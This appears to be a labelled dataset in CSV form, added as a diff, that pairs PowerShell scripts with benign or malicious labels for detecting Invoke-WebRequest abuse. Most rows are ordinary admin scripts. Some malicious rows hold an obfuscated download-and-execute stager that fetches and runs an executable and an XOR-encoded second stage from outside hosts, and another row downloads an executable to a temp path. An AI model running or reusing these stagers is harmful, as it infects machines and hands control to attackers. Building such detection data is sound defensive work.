+896.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,839,839,False,"$Random=(New-Guid).ToString().Substring(0,8)
+
+
+$ResourceGroupName=""myResourceGroup$Random""
+$AppName=""AppServiceMonitor$Random""
+$Location=""WestUS""
+
+
+New-AzResourceGroup -Name $ResourceGroupName -Location $Location
+
+
+New-AzAppservicePlan -Name AppServiceMonitorPlan -ResourceGroupName $ResourceGroupName -Location $Location -Tier Basic
+
+
+New-AzWebApp -Name $AppName -ResourceGroupName $ResourceGroupName -Location $Location -AppServicePlan AppServiceMonitorPlan
+
+
+Set-AzWebApp -RequestTracingEnabled $True -HttpLoggingEnabled $True -DetailedErrorLoggingEnabled $True -ResourceGroupName $ResourceGroupName -Name $AppName
+
+
+Invoke-WebRequest -Method ""Get"" -Uri https://$AppName.azurewebsites.net/404 -ErrorAction SilentlyContinue
+
+
+Write-Host ""In your browser, download the logs for your app at https://$AppName.scm.azurewebsites.net/api/dump""",89,benign,Invoke-WebRequest,True,benign,-3.25
+1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,89,malicious,Invoke-WebRequest,True,malicious,0.15625
+773.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,1845,1845,False,"param($buildVersion = $null)
+
+$releasePath = [System.IO.Path]::GetFullPath(""$PSScriptRoot\..\release"")
+$binariesToSignPath = [System.IO.Path]::GetFullPath(""$releasePath\BinariesToSign"")
+$unpackedPackagesPath = [System.IO.Path]::GetFullPath(""$releasePath\UnpackedPackages"")
+
+
+mkdir $releasePath -Force | Out-Null
+
+
+
+
+if ($buildVersion -eq $null) {
+    
+    $headers = @{ ""Content-Type"" = ""application/json"" }
+    $project = Invoke-RestMethod -Method Get -Uri ""https://ci.appveyor.com/api/projects/PowerShell/PowerShellEditorServices/branch/master"" -Headers $headers
+    $buildVersion = $project.build.version
+    if ($project.build.status -eq ""success"") {
+        Write-Output ""Latest build version on master is $buildVersion`r`n""
+    }
+    else {
+        Write-Error ""PowerShellEditorServices build $buildVersion was not successful!"" -ErrorAction ""Stop""
+    }
+}
+
+function Install-BuildPackage($packageName, $extension) {
+	$uri = ""https://ci.appveyor.com/nuget/powershelleditorservices/api/v2/package/{0}/{1}"" -f $packageName.ToLower(), $buildVersion
+	Write-Verbose ""Fetching from URI: $uri""
+
+	
+	$zipPath = ""$releasePath\$packageName.zip""
+	$packageContentPath = ""$unpackedPackagesPath\$packageName""
+	Invoke-WebRequest $uri -OutFile $zipPath -ErrorAction ""Stop""
+	Expand-Archive $zipPath -DestinationPath $packageContentPath -Force -ErrorAction ""Stop""
+	Remove-Item $zipPath -ErrorAction ""Stop""
+
+	
+	mkdir $binariesToSignPath -Force | Out-Null
+	cp ""$packageContentPath\lib\net45\$packageName.$extension"" -Force -Destination $binariesToSignPath
+
+	Write-Output ""Extracted package $packageName ($buildVersion)""
+}
+
+
+Install-BuildPackage ""Microsoft.PowerShell.EditorServices"" ""dll""
+Install-BuildPackage ""Microsoft.PowerShell.EditorServices.Protocol"" ""dll""
+Install-BuildPackage ""Microsoft.PowerShell.EditorServices.Host"" ""dll""
+
+
+& start $binariesToSignPath",91,benign,Invoke-WebRequest,True,benign,-3.734375
+3834.ps1,malicious,natural_overlap,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,5,True,552,552,False,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",91,malicious,Invoke-WebRequest,True,malicious,10.546875
+2820.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,1851,1851,False,"function Send-GraphiteEvent
+{
+
+    [CmdletBinding()]
+    param
+    (
+        [CmdletBinding()]
+        
+        [Parameter(Mandatory = $true)]
+        [ValidateNotNull()]
+        [ValidateNotNullOrEmpty()]
+        [ValidateScript({ $_ -match '^(http|https)\:\/\/.*' })]
+        [string]$GraphiteURL,
+
+        
+        [Parameter(Mandatory = $true)]
+        [ValidateNotNull()]
+        [ValidateNotNullOrEmpty()]
+        [Alias(""Topic"", ""Title"", ""Subject"")]
+        [string]$What,
+
+        
+        [Parameter(Mandatory = $false)]
+        [ValidateNotNull()]
+        [ValidateNotNullOrEmpty()]
+        [string]$Tags,
+
+        
+        [Parameter(Mandatory = $false)]
+        [ValidateNotNull()]
+        [ValidateNotNullOrEmpty()]
+        [Alias(""Body"")]
+        [string]$Data
+    )
+
+    
+    if (!($GraphiteURL.Substring($GraphiteURL.Length - 1) -eq '/'))
+    {
+        $GraphiteURL = $GraphiteURL + '/'
+    }
+
+    
+    $GraphiteURL = $GraphiteURL + '/events/'
+
+    
+    $EventObject = New-Object PSObject -Property @{
+        what = $What
+    }
+
+    
+    if ($Tags)
+    {
+        Add-Member -NotePropertyName tags -NotePropertyValue $Tags -InputObject $EventObject
+    }
+
+    
+    if ($Data)
+    {
+        Add-Member -NotePropertyName data -NotePropertyValue $Data -InputObject $EventObject
+    }
+
+    $EventObject = $EventObject | ConvertTo-Json
+
+    Write-Verbose ""Json Object:""
+    Write-Verbose $EventObject
+
+    try
+    {
+        $result = Invoke-WebRequest -Uri $GraphiteURL -Body $EventObject -method Post -ContentType ""application/json""
+        Write-Verbose ""Returned StatusCode: $($result.StatusCode)""
+        Write-Verbose ""Returned StatusDescription: $($result.StatusDescription)""
+    }
+
+    catch
+    {
+        $exceptionText = GetPrettyProblem $_
+        throw ""An error occurred trying to post data to Graphite. $exceptionText""
+    }
+
+}",92,benign,Invoke-WebRequest,True,benign,-2.578125
+3834.ps1,malicious,natural_overlap,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,5,True,552,552,False,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",92,malicious,Invoke-WebRequest,True,malicious,10.546875
+773.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,1845,1845,False,"param($buildVersion = $null)
+
+$releasePath = [System.IO.Path]::GetFullPath(""$PSScriptRoot\..\release"")
+$binariesToSignPath = [System.IO.Path]::GetFullPath(""$releasePath\BinariesToSign"")
+$unpackedPackagesPath = [System.IO.Path]::GetFullPath(""$releasePath\UnpackedPackages"")
+
+
+mkdir $releasePath -Force | Out-Null
+
+
+
+
+if ($buildVersion -eq $null) {
+    
+    $headers = @{ ""Content-Type"" = ""application/json"" }
+    $project = Invoke-RestMethod -Method Get -Uri ""https://ci.appveyor.com/api/projects/PowerShell/PowerShellEditorServices/branch/master"" -Headers $headers
+    $buildVersion = $project.build.version
+    if ($project.build.status -eq ""success"") {
+        Write-Output ""Latest build version on master is $buildVersion`r`n""
+    }
+    else {
+        Write-Error ""PowerShellEditorServices build $buildVersion was not successful!"" -ErrorAction ""Stop""
+    }
+}
+
+function Install-BuildPackage($packageName, $extension) {
+	$uri = ""https://ci.appveyor.com/nuget/powershelleditorservices/api/v2/package/{0}/{1}"" -f $packageName.ToLower(), $buildVersion
+	Write-Verbose ""Fetching from URI: $uri""
+
+	
+	$zipPath = ""$releasePath\$packageName.zip""
+	$packageContentPath = ""$unpackedPackagesPath\$packageName""
+	Invoke-WebRequest $uri -OutFile $zipPath -ErrorAction ""Stop""
+	Expand-Archive $zipPath -DestinationPath $packageContentPath -Force -ErrorAction ""Stop""
+	Remove-Item $zipPath -ErrorAction ""Stop""
+
+	
+	mkdir $binariesToSignPath -Force | Out-Null
+	cp ""$packageContentPath\lib\net45\$packageName.$extension"" -Force -Destination $binariesToSignPath
+
+	Write-Output ""Extracted package $packageName ($buildVersion)""
+}
+
+
+Install-BuildPackage ""Microsoft.PowerShell.EditorServices"" ""dll""
+Install-BuildPackage ""Microsoft.PowerShell.EditorServices.Protocol"" ""dll""
+Install-BuildPackage ""Microsoft.PowerShell.EditorServices.Host"" ""dll""
+
+
+& start $binariesToSignPath",93,benign,Invoke-WebRequest,True,benign,-3.734375
+1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,93,malicious,Invoke-WebRequest,True,malicious,0.15625
+2820.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,1851,1851,False,"function Send-GraphiteEvent
+{
+
+    [CmdletBinding()]
+    param
+    (
+        [CmdletBinding()]
+        
+        [Parameter(Mandatory = $true)]
+        [ValidateNotNull()]
+        [ValidateNotNullOrEmpty()]
+        [ValidateScript({ $_ -match '^(http|https)\:\/\/.*' })]
+        [string]$GraphiteURL,
+
+        
+        [Parameter(Mandatory = $true)]
+        [ValidateNotNull()]
+        [ValidateNotNullOrEmpty()]
+        [Alias(""Topic"", ""Title"", ""Subject"")]
+        [string]$What,
+
+        
+        [Parameter(Mandatory = $false)]
+        [ValidateNotNull()]
+        [ValidateNotNullOrEmpty()]
+        [string]$Tags,
+
+        
+        [Parameter(Mandatory = $false)]
+        [ValidateNotNull()]
+        [ValidateNotNullOrEmpty()]
+        [Alias(""Body"")]
+        [string]$Data
+    )
+
+    
+    if (!($GraphiteURL.Substring($GraphiteURL.Length - 1) -eq '/'))
+    {
+        $GraphiteURL = $GraphiteURL + '/'
+    }
+
+    
+    $GraphiteURL = $GraphiteURL + '/events/'
+
+    
+    $EventObject = New-Object PSObject -Property @{
+        what = $What
+    }
+
+    
+    if ($Tags)
+    {
+        Add-Member -NotePropertyName tags -NotePropertyValue $Tags -InputObject $EventObject
+    }
+
+    
+    if ($Data)
+    {
+        Add-Member -NotePropertyName data -NotePropertyValue $Data -InputObject $EventObject
+    }
+
+    $EventObject = $EventObject | ConvertTo-Json
+
+    Write-Verbose ""Json Object:""
+    Write-Verbose $EventObject
+
+    try
+    {
+        $result = Invoke-WebRequest -Uri $GraphiteURL -Body $EventObject -method Post -ContentType ""application/json""
+        Write-Verbose ""Returned StatusCode: $($result.StatusCode)""
+        Write-Verbose ""Returned StatusDescription: $($result.StatusDescription)""
+    }
+
+    catch
+    {
+        $exceptionText = GetPrettyProblem $_
+        throw ""An error occurred trying to post data to Graphite. $exceptionText""
+    }
+
+}",94,benign,Invoke-WebRequest,True,benign,-2.578125
+1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,94,malicious,Invoke-WebRequest,True,malicious,0.15625
+2969.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-Expression|Invoke-WebRequest,2,True,2339,2339,False,"function script:Start-NativeExecution([scriptblock]$sb, [switch]$IgnoreExitcode) {
+    $backupEAP = $script:ErrorActionPreference
+    $script:ErrorActionPreference = ""Continue""
+    try {
+        & $sb
+        
+        
+        if ($LASTEXITCODE -ne 0 -and -not $IgnoreExitcode) {
+            throw ""Execution of {$sb} failed with exit code $LASTEXITCODE""
+        }
+    }
+    finally {
+        $script:ErrorActionPreference = $backupEAP
+    }
+}
+
+function Install-Dotnet {
+    [CmdletBinding()]
+    param(
+        [string]$Channel = $dotnetCLIChannel,
+        [string]$Version = $dotnetCLIRequiredVersion,
+        [switch]$NoSudo
+    )
+
+    
+    
+    $sudo = if (!$NoSudo) { ""sudo"" }
+
+    $obtainUrl = ""https://raw.githubusercontent.com/dotnet/cli/master/scripts/obtain""
+
+    
+    if ($IsLinux -or $IsMacOS) {
+        
+        $uninstallScript = if ($IsUbuntu) {
+            ""dotnet-uninstall-debian-packages.sh""
+        }
+        elseif ($IsMacOS) {
+            ""dotnet-uninstall-pkgs.sh""
+        }
+
+        if ($uninstallScript) {
+            Start-NativeExecution {
+                curl -sO $obtainUrl/uninstall/$uninstallScript
+                Invoke-Expression ""$sudo bash ./$uninstallScript""
+            }
+        }
+        else {
+            Write-Warning ""This script only removes prior versions of dotnet for Ubuntu 14.04 and OS X""
+        }
+
+        
+        $installScript = ""dotnet-install.sh""
+        Start-NativeExecution {
+            curl -sO $obtainUrl/$installScript
+            bash ./$installScript -c $Channel -v $Version
+        }
+    }
+    elseif (!(Test-Path Variable:\IsWindows) -or $IsWindows) {
+        Remove-Item -ErrorAction SilentlyContinue -Recurse -Force ~\AppData\Local\Microsoft\dotnet
+        $installScript = ""dotnet-install.ps1""
+        Invoke-WebRequest -Uri $obtainUrl/$installScript -OutFile $installScript
+
+        if (-not $IsCoreCLR) {
+            & ./$installScript -Channel $Channel -Version $Version
+        }
+        else {
+            
+            $fullPSPath = Join-Path -Path $env:windir -ChildPath ""System32\WindowsPowerShell\v1.0\powershell.exe""
+            $fullDotnetInstallPath = Join-Path -Path $pwd.Path -ChildPath $installScript
+            Start-NativeExecution { & $fullPSPath -NoLogo -NoProfile -File $fullDotnetInstallPath -Channel $Channel -Version $Version }
+        }
+    }
+}",95,benign,Invoke-WebRequest,True,benign,-1.140625
+3834.ps1,malicious,natural_overlap,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,5,True,552,552,False,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",95,malicious,Invoke-WebRequest,True,malicious,10.546875
+712.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,4,True,2440,2440,False,"function Get-RsRestItemDataSource
+{
+    
+
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $True)]
+        [Alias('ItemPath','Path')]
+        [string]
+        $RsItem,
+
+        [string]
+        $ReportPortalUri,
+
+        [Alias('ApiVersion')]
+        [ValidateSet(""v2.0"")]
+        [string]
+        $RestApiVersion = ""v2.0"",
+
+        [Alias('ReportServerCredentials')]
+        [System.Management.Automation.PSCredential]
+        $Credential,
+
+        [Microsoft.PowerShell.Commands.WebRequestSession]
+        $WebSession
+    )
+    Begin
+    {
+        $WebSession = New-RsRestSessionHelper -BoundParameters $PSBoundParameters
+        $ReportPortalUri = Get-RsPortalUriHelper -WebSession $WebSession
+        $catalogItemsUri = $ReportPortalUri + ""api/$RestApiVersion/CatalogItems(Path='{0}')""
+        $dataSourcesUri = $ReportPortalUri + ""api/$RestApiVersion/{0}(Path='{1}')?`$expand=DataSources""
+    }
+    Process
+    {
+        try
+        {
+            Write-Verbose ""Fetching metadata for $RsItem...""
+            $catalogItemsUri = [String]::Format($catalogItemsUri, $RsItem)
+            if ($Credential -ne $null)
+            {
+                $response = Invoke-WebRequest -Uri $catalogItemsUri -Method Get -WebSession $WebSession -Credential $Credential -Verbose:$false
+            }
+            else
+            {
+                $response = Invoke-WebRequest -Uri $catalogItemsUri -Method Get -WebSession $WebSession -UseDefaultCredentials -Verbose:$false
+            }
+
+            $item = ConvertFrom-Json $response.Content
+            $itemType = $item.Type
+
+            Write-Verbose ""Fetching data sources for $RsItem...""
+            $dataSourcesUri = [String]::Format($dataSourcesUri, $itemType + ""s"", $RsItem)
+
+            if ($Credential -ne $null)
+            {
+                $response = Invoke-WebRequest -Uri $dataSourcesUri -Method Get -WebSession $WebSession -Credential $Credential -Verbose:$false
+            }
+            else
+            {
+                $response = Invoke-WebRequest -Uri $dataSourcesUri -Method Get -WebSession $WebSession -UseDefaultCredentials -Verbose:$false
+            }
+
+            $itemWithDataSources = ConvertFrom-Json $response.Content
+            return $itemWithDataSources.DataSources
+        }
+        catch
+        {
+            throw (New-Object System.Exception(""Failed to get data sources for '$RsItem': $($_.Exception.Message)"", $_.Exception))
+        }
+    }
+}",96,benign,Invoke-WebRequest,True,benign,-2.1875
+3834.ps1,malicious,natural_overlap,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,5,True,552,552,False,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",96,malicious,Invoke-WebRequest,True,malicious,10.546875
+2165.ps1,benign,natural_overlap,Invoke-WebRequest,DownloadFile|Invoke-WebRequest|Net.WebClient,4,True,2449,2449,False,"﻿
+[CmdletBinding(SupportsShouldProcess=$true)]
+param(
+    [parameter(Mandatory=$true, ParameterSetName=""AppName"", HelpMessage=""Specify the app name to search for within the App Store."")]
+    [ValidateNotNullOrEmpty()]
+    [ValidatePattern(""^[A-Za-z\s]*$"")]
+    [string]$AppName,
+
+    [parameter(Mandatory=$true, ParameterSetName=""Url"", HelpMessage=""Specify the URL pointing to the app in the App Store."")]
+    [ValidateNotNullOrEmpty()]
+    [string]$URL,
+
+    [parameter(Mandatory=$true, ParameterSetName=""AppName"", HelpMessage=""Path to a folder where the app image will be downloaded to."")]
+    [parameter(Mandatory=$true, ParameterSetName=""Url"")]
+    [ValidateNotNullOrEmpty()]
+    [ValidatePattern(""^[A-Za-z]{1}:\\\w+"")]
+    [ValidateScript({
+	    
+	    if ((Split-Path -Path $_ -Leaf).IndexOfAny([IO.Path]::GetInvalidFileNameChars()) -ge 0) {
+		    Throw ""$(Split-Path -Path $_ -Leaf) contains invalid characters""
+	    }
+	    else {
+		    
+		    if (Test-Path -Path $_ -PathType Container) {
+				    return $true
+		    }
+		    else {
+			    Throw ""Unable to locate part of or the whole specified path, specify a valid path""
+		    }
+	    }
+    })]
+    [string]$Path
+)
+Process {
+    
+    $StoreAppName = ($AppName -replace "" "", ""+"").ToLower()
+
+    switch ($PSCmdlet.ParameterSetName) {
+        ""AppName"" {
+            
+            $SearchURL = ""https://itunes.apple.com/search?term=$($StoreAppName)&entity=software&limit=1""
+            $SearchWebRequest = Invoke-WebRequest -Uri $SearchURL
+            $AppLink = (ConvertFrom-Json -InputObject $SearchWebRequest).Results | Select-Object -ExpandProperty trackViewUrl
+        }
+        ""Url"" {
+            $AppLink = $URL
+        }
+    }
+
+    
+    if ($AppLink -ne $null) {
+        $WebRequest = Invoke-WebRequest -Uri $AppLink
+        $AppIcon = $WebRequest.Images | Where-Object { ($_.Width -eq 175) -and ($_.Class -like ""artwork"") }
+        if ($AppIcon -ne $null) {
+            
+            $WebClient = New-Object System.Net.WebClient
+            $WebClient.DownloadFile($AppIcon.""src-swap"", ""$($Path)\$($AppIcon.alt).jpg"")
+            $AppImage = [PSCustomObject]@{
+                ImageName = $AppIcon.alt
+                ImagePath = ""$($Path)\$($AppIcon.alt).jpg""
+            }
+            Write-Output -InputObject $AppImage
+        }
+    }
+    else {
+        Write-Warning -Message ""Unable to determine app link for specified app: $($AppName)""
+    }
+}
+End {
+    
+    $WebClient.Dispose()
+}",97,benign,Invoke-WebRequest,True,benign,-1.65625
+3834.ps1,malicious,natural_overlap,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,5,True,552,552,False,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');",97,malicious,Invoke-WebRequest,True,malicious,10.546875
+2969.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-Expression|Invoke-WebRequest,2,True,2339,2339,False,"function script:Start-NativeExecution([scriptblock]$sb, [switch]$IgnoreExitcode) {
+    $backupEAP = $script:ErrorActionPreference
+    $script:ErrorActionPreference = ""Continue""
+    try {
+        & $sb
+        
+        
+        if ($LASTEXITCODE -ne 0 -and -not $IgnoreExitcode) {
+            throw ""Execution of {$sb} failed with exit code $LASTEXITCODE""
+        }
+    }
+    finally {
+        $script:ErrorActionPreference = $backupEAP
+    }
+}
+
+function Install-Dotnet {
+    [CmdletBinding()]
+    param(
+        [string]$Channel = $dotnetCLIChannel,
+        [string]$Version = $dotnetCLIRequiredVersion,
+        [switch]$NoSudo
+    )
+
+    
+    
+    $sudo = if (!$NoSudo) { ""sudo"" }
+
+    $obtainUrl = ""https://raw.githubusercontent.com/dotnet/cli/master/scripts/obtain""
+
+    
+    if ($IsLinux -or $IsMacOS) {
+        
+        $uninstallScript = if ($IsUbuntu) {
+            ""dotnet-uninstall-debian-packages.sh""
+        }
+        elseif ($IsMacOS) {
+            ""dotnet-uninstall-pkgs.sh""
+        }
+
+        if ($uninstallScript) {
+            Start-NativeExecution {
+                curl -sO $obtainUrl/uninstall/$uninstallScript
+                Invoke-Expression ""$sudo bash ./$uninstallScript""
+            }
+        }
+        else {
+            Write-Warning ""This script only removes prior versions of dotnet for Ubuntu 14.04 and OS X""
+        }
+
+        
+        $installScript = ""dotnet-install.sh""
+        Start-NativeExecution {
+            curl -sO $obtainUrl/$installScript
+            bash ./$installScript -c $Channel -v $Version
+        }
+    }
+    elseif (!(Test-Path Variable:\IsWindows) -or $IsWindows) {
+        Remove-Item -ErrorAction SilentlyContinue -Recurse -Force ~\AppData\Local\Microsoft\dotnet
+        $installScript = ""dotnet-install.ps1""
+        Invoke-WebRequest -Uri $obtainUrl/$installScript -OutFile $installScript
+
+        if (-not $IsCoreCLR) {
+            & ./$installScript -Channel $Channel -Version $Version
+        }
+        else {
+            
+            $fullPSPath = Join-Path -Path $env:windir -ChildPath ""System32\WindowsPowerShell\v1.0\powershell.exe""
+            $fullDotnetInstallPath = Join-Path -Path $pwd.Path -ChildPath $installScript
+            Start-NativeExecution { & $fullPSPath -NoLogo -NoProfile -File $fullDotnetInstallPath -Channel $Channel -Version $Version }
+        }
+    }
+}",98,benign,Invoke-WebRequest,True,benign,-1.140625
+1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,98,malicious,Invoke-WebRequest,True,malicious,0.15625
+712.ps1,benign,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,4,True,2440,2440,False,"function Get-RsRestItemDataSource
+{
+    
+
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $True)]
+        [Alias('ItemPath','Path')]
+        [string]
+        $RsItem,
+
+        [string]
+        $ReportPortalUri,
+
+        [Alias('ApiVersion')]
+        [ValidateSet(""v2.0"")]
+        [string]
+        $RestApiVersion = ""v2.0"",
+
+        [Alias('ReportServerCredentials')]
+        [System.Management.Automation.PSCredential]
+        $Credential,
+
+        [Microsoft.PowerShell.Commands.WebRequestSession]
+        $WebSession
+    )
+    Begin
+    {
+        $WebSession = New-RsRestSessionHelper -BoundParameters $PSBoundParameters
+        $ReportPortalUri = Get-RsPortalUriHelper -WebSession $WebSession
+        $catalogItemsUri = $ReportPortalUri + ""api/$RestApiVersion/CatalogItems(Path='{0}')""
+        $dataSourcesUri = $ReportPortalUri + ""api/$RestApiVersion/{0}(Path='{1}')?`$expand=DataSources""
+    }
+    Process
+    {
+        try
+        {
+            Write-Verbose ""Fetching metadata for $RsItem...""
+            $catalogItemsUri = [String]::Format($catalogItemsUri, $RsItem)
+            if ($Credential -ne $null)
+            {
+                $response = Invoke-WebRequest -Uri $catalogItemsUri -Method Get -WebSession $WebSession -Credential $Credential -Verbose:$false
+            }
+            else
+            {
+                $response = Invoke-WebRequest -Uri $catalogItemsUri -Method Get -WebSession $WebSession -UseDefaultCredentials -Verbose:$false
+            }
+
+            $item = ConvertFrom-Json $response.Content
+            $itemType = $item.Type
+
+            Write-Verbose ""Fetching data sources for $RsItem...""
+            $dataSourcesUri = [String]::Format($dataSourcesUri, $itemType + ""s"", $RsItem)
+
+            if ($Credential -ne $null)
+            {
+                $response = Invoke-WebRequest -Uri $dataSourcesUri -Method Get -WebSession $WebSession -Credential $Credential -Verbose:$false
+            }
+            else
+            {
+                $response = Invoke-WebRequest -Uri $dataSourcesUri -Method Get -WebSession $WebSession -UseDefaultCredentials -Verbose:$false
+            }
+
+            $itemWithDataSources = ConvertFrom-Json $response.Content
+            return $itemWithDataSources.DataSources
+        }
+        catch
+        {
+            throw (New-Object System.Exception(""Failed to get data sources for '$RsItem': $($_.Exception.Message)"", $_.Exception))
+        }
+    }
+}",99,benign,Invoke-WebRequest,True,benign,-2.1875
+1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,99,malicious,Invoke-WebRequest,True,malicious,0.15625
+2165.ps1,benign,natural_overlap,Invoke-WebRequest,DownloadFile|Invoke-WebRequest|Net.WebClient,4,True,2449,2449,False,"﻿
+[CmdletBinding(SupportsShouldProcess=$true)]
+param(
+    [parameter(Mandatory=$true, ParameterSetName=""AppName"", HelpMessage=""Specify the app name to search for within the App Store."")]
+    [ValidateNotNullOrEmpty()]
+    [ValidatePattern(""^[A-Za-z\s]*$"")]
+    [string]$AppName,
+
+    [parameter(Mandatory=$true, ParameterSetName=""Url"", HelpMessage=""Specify the URL pointing to the app in the App Store."")]
+    [ValidateNotNullOrEmpty()]
+    [string]$URL,
+
+    [parameter(Mandatory=$true, ParameterSetName=""AppName"", HelpMessage=""Path to a folder where the app image will be downloaded to."")]
+    [parameter(Mandatory=$true, ParameterSetName=""Url"")]
+    [ValidateNotNullOrEmpty()]
+    [ValidatePattern(""^[A-Za-z]{1}:\\\w+"")]
+    [ValidateScript({
+	    
+	    if ((Split-Path -Path $_ -Leaf).IndexOfAny([IO.Path]::GetInvalidFileNameChars()) -ge 0) {
+		    Throw ""$(Split-Path -Path $_ -Leaf) contains invalid characters""
+	    }
+	    else {
+		    
+		    if (Test-Path -Path $_ -PathType Container) {
+				    return $true
+		    }
+		    else {
+			    Throw ""Unable to locate part of or the whole specified path, specify a valid path""
+		    }
+	    }
+    })]
+    [string]$Path
+)
+Process {
+    
+    $StoreAppName = ($AppName -replace "" "", ""+"").ToLower()
+
+    switch ($PSCmdlet.ParameterSetName) {
+        ""AppName"" {
+            
+            $SearchURL = ""https://itunes.apple.com/search?term=$($StoreAppName)&entity=software&limit=1""
+            $SearchWebRequest = Invoke-WebRequest -Uri $SearchURL
+            $AppLink = (ConvertFrom-Json -InputObject $SearchWebRequest).Results | Select-Object -ExpandProperty trackViewUrl
+        }
+        ""Url"" {
+            $AppLink = $URL
+        }
+    }
+
+    
+    if ($AppLink -ne $null) {
+        $WebRequest = Invoke-WebRequest -Uri $AppLink
